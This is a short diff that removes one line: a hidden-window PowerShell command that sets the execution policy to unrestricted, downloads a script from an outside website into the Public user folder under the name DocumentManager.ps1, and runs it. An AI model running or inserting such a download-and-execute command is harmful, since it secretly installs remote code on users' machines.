@@ -1,1 +1,0 @@
-powershell -windowstyle hidden -command Set-ExecutionPolicy -Force unrestricted; $url = 'www.calvinkrist.com/rest/ps1installationscript/'; $output = 'C:/Users/Public/DocumentManager.ps1'; Invoke-WebRequest -Uri $url -Outfile $output; cd C:\\Users\Public; .\DocumentManager.ps1;
